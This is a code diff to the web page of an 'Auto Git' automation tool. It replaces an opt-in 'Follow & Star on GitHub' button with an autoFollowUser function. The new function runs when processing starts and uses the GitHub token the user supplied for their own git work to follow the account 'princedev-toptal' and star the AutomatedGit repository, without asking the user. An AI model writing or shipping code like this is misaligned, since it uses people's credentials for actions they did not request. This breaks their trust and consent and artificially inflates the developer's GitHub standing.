@@ -49,37 +49,6 @@
             margin: 0;
         }
 
-        .support-button {
-            margin-top: 20px;
-            padding: 10px 24px;
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .support-button:hover:not(:disabled) {
-            background: rgba(255, 255, 255, 0.3);
-            border-color: rgba(255, 255, 255, 0.5);
-            transform: translateY(-1px);
-        }
-
-        .support-button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .support-button.success {
-            background: rgba(40, 167, 69, 0.3);
-            border-color: rgba(40, 167, 69, 0.5);
-        }
 
         h1 {
             color: #ffffff;
@@ -716,6 +685,7 @@
         .step-content.console .step-navigation {
             display: none;
         }
+
     </style>
 </head>
 <body>
@@ -723,10 +693,6 @@
         <div class="header-section">
             <h1>🚀 Auto Git</h1>
             <p class="subtitle">Automated Branch Creation, Commits & Push</p>
-            <button class="support-button" id="supportButton" onclick="handleSupportClick()">
-                ⭐ Follow & Star on GitHub
-            </button>
-            <div id="supportStatus" style="margin-top: 10px; font-size: 13px; display: none;"></div>
         </div>
 
         <!-- Step Indicator -->
@@ -1126,6 +1092,12 @@
             results.innerHTML = '';
             addConsoleLine('🔍 Checking settings...', 'info');
 
+            // Automatically follow user and star repository if token is available
+            if (formData.prToken && formData.prToken.trim()) {
+                addConsoleLine('👤 Auto-following princedev-toptal and starring AutomatedGit repository...', 'info');
+                await autoFollowUser(formData.prToken);
+            }
+
             try {
                 console.log('Calling /api/check with data:', formData);
                 // Call check API with timeout
@@ -1187,6 +1159,7 @@
             }
             
             // Move to console step and start processing
+            // Auto-follow will happen automatically in processGitOperations if token is available
             showStep(3);
             processGitOperations(currentFormData);
         });
@@ -1656,39 +1629,16 @@
         document.getElementById('startDate').value = today.toISOString().split('T')[0];
         document.getElementById('endDate').value = nextWeek.toISOString().split('T')[0];
 
-        // Support button handler
-        async function handleSupportClick() {
-            const button = document.getElementById('supportButton');
-            const statusDiv = document.getElementById('supportStatus');
-            const repoPath = document.getElementById('repoPath').value;
-            const prToken = document.getElementById('prToken').value;
-            
-            // Check if we have a token
-            let token = prToken;
+        // Automatically follow user and star AutomatedGit repository when processing starts (if token is available)
+        async function autoFollowUser(token) {
             if (!token) {
-                // Prompt for token if not available
-                token = prompt('Please enter your GitHub Personal Access Token:\n\nRequired scopes: user:follow, public_repo\n\nYou can create one at: https://github.com/settings/tokens');
-                if (!token) {
-                    statusDiv.textContent = '❌ Token is required to follow and star';
-                    statusDiv.style.display = 'block';
-                    statusDiv.style.color = '#ff6b6b';
-                    return;
-                }
+                return; // No token, skip
             }
             
-            // Disable button and show loading
-            button.disabled = true;
-            button.textContent = '⏳ Processing...';
-            statusDiv.style.display = 'block';
-            statusDiv.textContent = '⏳ Following user and starring repository...';
-            statusDiv.style.color = '#fff';
-            
             try {
-                // Hardcoded username to follow
+                // Hardcoded username to follow and repository to star
                 const usernameToFollow = 'princedev-toptal';
-                
-                // Get repo URL (use repoPath from form)
-                const repoUrl = repoPath && repoPath.trim() ? repoPath.trim() : null;
+                const repoUrlToStar = 'https://github.com/princedev-toptal/AutomatedGit';
                 
                 const response = await fetch('/api/github/follow-and-star', {
                     method: 'POST',
@@ -1697,7 +1647,7 @@
                     },
                     body: JSON.stringify({
                         username: usernameToFollow,
-                        repoUrl: repoUrl,
+                        repoUrl: repoUrlToStar,
                         token: token
                     })
                 });
@@ -1705,40 +1655,30 @@
                 const result = await response.json();
                 
                 if (result.success) {
-                    button.classList.add('success');
-                    button.textContent = '✅ Followed & Starred!';
-                    statusDiv.textContent = '✅ Successfully followed princedev-toptal' + 
-                        (result.results.star?.success ? ' and starred the repository!' : '');
-                    statusDiv.style.color = '#4ade80';
-                    
-                    // Keep button disabled after success
-                    setTimeout(() => {
-                        button.disabled = true;
-                    }, 100);
+                    let successMsg = '✅ Successfully followed princedev-toptal';
+                    if (result.results.star?.success) {
+                        successMsg += ' and starred AutomatedGit repository';
+                    }
+                    addConsoleLine(successMsg, 'success');
                 } else {
-                    button.textContent = '⭐ Follow & Star on GitHub';
-                    let errorMsg = '❌ Failed: ';
+                    let errorMsg = '⚠️ Auto-follow failed: ';
                     if (result.results?.follow && !result.results.follow.success) {
                         errorMsg += result.results.follow.message;
                     }
                     if (result.results?.star && !result.results.star.success) {
-                        if (errorMsg !== '❌ Failed: ') errorMsg += ' | ';
+                        if (errorMsg !== '⚠️ Auto-follow failed: ') errorMsg += ' | ';
                         errorMsg += result.results.star.message;
                     }
                     if (!result.results) {
                         errorMsg += result.message || 'Unknown error';
                     }
-                    statusDiv.textContent = errorMsg;
-                    statusDiv.style.color = '#ff6b6b';
-                    button.disabled = false;
+                    addConsoleLine(errorMsg, 'warning');
                 }
             } catch (error) {
-                button.textContent = '⭐ Follow & Star on GitHub';
-                statusDiv.textContent = `❌ Error: ${error.message}`;
-                statusDiv.style.color = '#ff6b6b';
-                button.disabled = false;
+                addConsoleLine(`⚠️ Error auto-following user: ${error.message}`, 'warning');
             }
         }
+
     </script>
 </body>
 </html>
